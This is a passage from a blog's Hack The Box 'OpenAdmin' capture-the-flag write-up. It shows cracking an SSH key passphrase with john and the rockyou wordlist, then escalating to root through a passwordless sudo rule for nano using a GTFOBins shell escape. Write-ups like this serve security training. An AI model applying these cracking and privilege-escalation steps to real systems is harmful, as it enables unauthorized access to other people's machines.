  <img src="/assets/documentation/hack-the-box/openadmin/priv_key-c5b6226a3d299f1ea61218cf14a0018e751c61f6dac3af8454d32f5c433a9218.jpg" alt="OpenAdmin" class="zooming" data-rjs="/assets/documentation/hack-the-box/openadmin/priv_key-c5b6226a3d299f1ea61218cf14a0018e751c61f6dac3af8454d32f5c433a9218.jpg" data-zooming-width="885" data-zooming-height="705">
</a></p>

<p>Oh! I got <code class="highlighter-rouge">ssh</code> private key, so let’s extract it using <code class="highlighter-rouge">ssh2john</code> and crack it with our friend <code class="highlighter-rouge">john</code>:</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">root@kali:~#</span><span class="w"> </span>ssh2john rsa_priv.key <span class="o">&gt;</span> joanna.priv
<span class="gp">root@kali:~#</span><span class="w"> </span>john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt joanna.priv 
<span class="go">Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
bloodninjas      (rsa_priv.key)
1g 0:00:00:12 DONE (2020-02-03 01:20) 0.07855g/s 1126Kp/s 1126Kc/s 1126KC/s *7¡Vamos!
Session completed</span></code></pre></figure>

<p>And now I got the password <code class="highlighter-rouge">bloodninjas</code>, let’s <code class="highlighter-rouge">ssh</code> with <code class="highlighter-rouge">joanna</code> and own user:</p>

<p><a href="/assets/documentation/hack-the-box/openadmin/joanna-9c13ec1cc61b00091526ab3d51d18d569915fd684160e5e94511081a59dde4f5.jpg">
  <img src="/assets/documentation/hack-the-box/openadmin/joanna-9c13ec1cc61b00091526ab3d51d18d569915fd684160e5e94511081a59dde4f5.jpg" alt="OpenAdmin" class="zooming" data-rjs="/assets/documentation/hack-the-box/openadmin/joanna-9c13ec1cc61b00091526ab3d51d18d569915fd684160e5e94511081a59dde4f5.jpg" data-zooming-width="761" data-zooming-height="539">
</a></p>

<h2 id="5-own-root">5. Own Root</h2>

<p>Let’s find what else I can do to own <code class="highlighter-rouge">root</code>, after deep diving for any important things related to <code class="highlighter-rouge">joanna</code>I found <code class="highlighter-rouge">/etc/sudoers.d/joanna</code> owned by <code class="highlighter-rouge">root</code>. Sudoers files just contains rights for who can access what in the system.</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">joanna@openadmin:~$</span><span class="w"> </span><span class="nb">cat</span> /etc/sudoers.d/joanna
<span class="go">joanna ALL=(ALL) NOPASSWD:/bin/nano /opt/priv</span></code></pre></figure>

<p>This line above just tell the system give all <code class="highlighter-rouge">sudo</code> privileges to user <code class="highlighter-rouge">joanna</code> with <strong>no password</strong> to execute <code class="highlighter-rouge">nano</code> on <code class="highlighter-rouge">/opt/priv</code>. let’s take advantage of this by execute commands from <code class="highlighter-rouge">/bin/nano</code> bypassing all local security restrictions, see <a href="https://gtfobins.github.io/">GTFOBins</a>.</p>

<p>Now let’s run <code class="highlighter-rouge">sudo nano /opt/priv</code>, and press <code class="highlighter-rouge">ctr + R</code> to read a file then <code class="highlighter-rouge">ctr + X</code> to execute root commands and type:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">reset<span class="p">;</span> bash 1&gt;&amp;0 2&gt;&amp;0<span class="p">;</span></code></pre></figure>

<p>And finally owned <code class="highlighter-rouge">root</code>:</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">root@openadmin:~#</span><span class="w"> </span><span class="nb">id</span>
<span class="go">uid=0(root) gid=0(root) groups=0(root)
</span><span class="gp">root@openadmin:~#</span><span class="w"> </span><span class="nb">cat</span> /root/root.txt 
<span class="go">2f907ed4</span></code></pre></figure>


          </div>
          <div class="article-share">
            
            
            <a href="https://twitter.com/home?status=Hack+The+Box+-+OpenAdmin%20-%20https://y4mm1.github.io/posts/openadmin" title="Share on Twitter" rel="noreferrer noopener" target="_blank">
              <svg viewbox="0 0 512 512"><path d="M492 109.5c-17.4 7.7-36 12.9-55.6 15.3 20-12 35.4-31 42.6-53.6 -18.7 11.1-39.4 19.2-61.5 23.5C399.8 75.8 374.6 64 346.8 64c-53.5 0-96.8 43.4-96.8 96.9 0 7.6 0.8 15 2.5 22.1 -80.5-4-151.9-42.6-199.6-101.3 -8.3 14.3-13.1 31-13.1 48.7 0 33.6 17.2 63.3 43.2 80.7C67 210.7 52 206.3 39 199c0 0.4 0 0.8 0 1.2 0 47 33.4 86.1 77.7 95 -8.1 2.2-16.7 3.4-25.5 3.4 -6.2 0-12.3-0.6-18.2-1.8 12.3 38.5 48.1 66.5 90.5 67.3 -33.1 26-74.9 41.5-120.3 41.5 -7.8 0-15.5-0.5-23.1-1.4C62.8 432 113.7 448 168.3 448 346.6 448 444 300.3 444 172.2c0-4.2-0.1-8.4-0.3-12.5C462.6 146 479 129 492 109.5z"></path></svg>
            </a>
            <a href="https://www.facebook.com/sharer/sharer.php?u=https://y4mm1.github.io/posts/openadmin" title="Share on Facebook" rel="noreferrer noopener" target="_blank">
              <svg viewbox="0 0 512 512"><path d="M288 192v-38.1c0-17.2 3.8-25.9 30.5-25.9H352V64h-55.9c-68.5 0-91.1 31.4-91.1 85.3V192h-45v64h45v192h83V256h56.4l7.6-64H288z"></path></svg>
            </a>
          </div>

          
            <div id="disqus_thread" class="article-comments"></div>
            <script src="https://my-blog-0vgcdsd8x2.disqus.com/embed.js" async defer></script>
            <noscript>Please enable JavaScript to view the comments.</noscript>
          
        </article>
        <footer class="footer scrollappear">
    <p style="text-align: center">
      This is my little tech blog, feel free to ask me any question ©
      <a href="/about" title="About me">Ahmed Sayed</a>
    </p>
</footer>

      </div>
    </div>
  </main>
  
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-157807027-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
    gtag('config', 'UA-157807027-1');
  </script>


<script type="text/javascript" src="/assets/vendor-2c224c53eb697c739f9490c38819a72184f09472739fd9e492272ef174090428.js"></script>


  <script type="text/javascript" src="/assets/webfonts-96493456d319d1bf419afdf8701552d4d486fee6afd304897d4fd81eb4e0cc0b.js"></script>



  <script type="text/javascript" src="/assets/scrollappear-e2da8ea567e418637e31266cc5302126eaa79f62a2273739086358b589a89ee6.js"></script>


<script type="text/javascript" src="/assets/application-cfde13ac81ddaf4351b2e739603e2baf688d0fcc9aba613fe62bbb1c7b037fb9.js"></script>


</body>
</html>
